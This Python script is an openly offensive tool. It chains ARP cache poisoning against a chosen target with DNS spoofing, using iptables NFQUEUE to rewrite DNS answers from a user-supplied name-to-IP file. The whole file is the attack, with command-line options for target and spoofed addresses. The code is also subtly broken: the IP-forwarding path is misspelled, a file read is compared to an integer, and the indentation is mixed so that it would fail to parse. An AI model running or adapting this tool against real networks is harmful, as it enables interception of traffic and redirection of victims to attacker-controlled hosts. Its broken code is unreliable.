from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import sys
import argparse
import threading
import time


class Arp_spoof:

#the ipstl variable is the spoofed ip, target is the ip of the target machine
	def __init__(self, ipstl, target, verbose=False):
		self.ipstl = ipstl
		self.target = target
		self.verbose = verbose
	
	def __call__(self):
		ipstl= self.ipstl
		target= self.target
		try:
			while True:
				self.ARPSpoofing(ipstl, target)
				self.ARPSpoofing(target, ipstl)
				time.sleep(2)
				
		except KeyboardInterrupt:
			print("\n[+] Ctl+C pressed, Stoping Arp spoofing...")
			print("[+] Restauring the target Arp cache...")
			self.restore(ipstl, target)
			self.restore(target,ipstl)
			print("[*] Arp cache restaured Successfuly!!!")
	
	# Enables routing in linux distribution	
	def routing_linux(self):
		with open("/proc/sys/net/ipv4/ip_forward") as fs:
			if fs.read() == 1:
				return
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forword")

	#enables routing on linux
	def enable_routing(self):
		self.routing_linux()
		if self.verbose:
			print("[*] IP Routing enabled.")

	def getmac(self,ip):
		admac,_ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=3, verbose=False)
		if admac:
			return(admac[0][1].hwsrc)

	def ARPSpoofing(self,ipstl,target):
		paquet = ARP(op=2, hwdst=self.getmac(target), psrc=ipstl, pdst=target)
		send(paquet)
	
	#this function restore the target arp cache
	def restore(self,destination_ip, source_ip):
		destination_mac = self.getmac(destination_ip)
		source_mac = self.getmac(source_ip)
		packet = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
		
		send(packet, verbose = False)
	

class Dns_spoof:
	def __init__(self, dnsdict, queueNum=1, verbose=True):
		self.dnsdict = dnsdict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()
		self.verbose = verbose

	def __call__(self):

		print("[*] starting DNS Spoofing")
        	os.system("iptables -I FORWARD -j NFQUEUE --queue-num %s"%self.queueNum)
        	self.queue.bind(self.queueNum, self.intercept_linux)
        	try:
	    		self.queue.run()
        	except KeyboardInterrupt:
           		print("\n[*] Ctl+C pressed, Stoping DNS spoofing...")
            		os.system("iptables -D FORWARD -j NFQUEUE --queue-num %s"%self.queueNum)
            		print("[!] iptables restaured!!! ")
			print("[!] DNS spoof stopped!!!")
			
	def transform_packet(self, packet):
		qname = packet[DNSQR].qname
		if qname not in self.dnsdict:
			return packet
		packet[DNS].an = DNSRR(rrname=qname, rdata=self.dnsdict[str(qname)[2:-1]])
		packet[DNS].ancount = 1
        	del packet[IP].len
        	del packet[IP].chksum
        	del packet[UDP].len
        	del packet[UDP].chksum
        	return packet

	def intercept_linux(self, packet):
		scapypacket = IP(packet.get_payload())
        	if scapypacket.haslayer(DNSRR) and self.verbose:
            		print("[+] Original packet %s"%scapypacket.summary())
            		try:
				scapypacket = self.transform_packet(scapypacket)
            		except IndexError:
                		pass
            		print("[+] New packet %s"%scapypacket.summary())
            		packet.set_payload(bytes(scapypacket))

        	elif scapypacket.haslayer(DNSRR) and not self.verbose:
            		try:
				scapypacket = self.transform_packet(scapypacket)
            		except IndexError:
                		pass
            		packet.set_payload(bytes(scapypacket))
                return packet.accept()

def main(args):
	
	with open(args.dnsdic,"r") as fs:
		dic = fs.read().splitlines()
	dnsdict = {}
	for li in dic:
		key,value = li.split(':')
		dnsdict[key] = bytes(value)
	
	arpspoof = Arp_spoof(args.ipstl, args.target)
	dnspoof = Dns_spoof(dnsdict)
	arpsf= threading.Thread(target= arpspoof)
	dnspsf=threading.Thread(target=dnspoof)
	try:
		arpsf.start()
		dnspsf.start()
	except KeyboardInterrupt:
		arpsf.stop()
		dnspsf.stop()	

def parse_args(args):
        parser = argparse.ArgumentParser()
	parser.add_argument("-s", dest="ipstl", help="The spoofed IP address")
	parser.add_argument("-d", dest="target", help="The target Ip address")
	parser.add_argument("-f", dest="dnsdic", help="The DNS mapping records dictionary file")
	parser.add_argument("-v","--verbose", help="for verbose state", action="store_true")
	arg = parser.parse_args()
	if len(sys.argv) < 3:
		parser.print_help()
		sys.exit(1)
        if not os.path.isfile(arg.dnsdic):
             print("[!] Unable to open the file %s"%arg.dnsdic)
             sys.exit(-1)
        return parser.parse_args(args)

if __name__ == '__main__':
	try:
		main(parse_args(sys.argv[1:]))
	except OSError:
		print("[-] programme interrupted by an os error!!!")
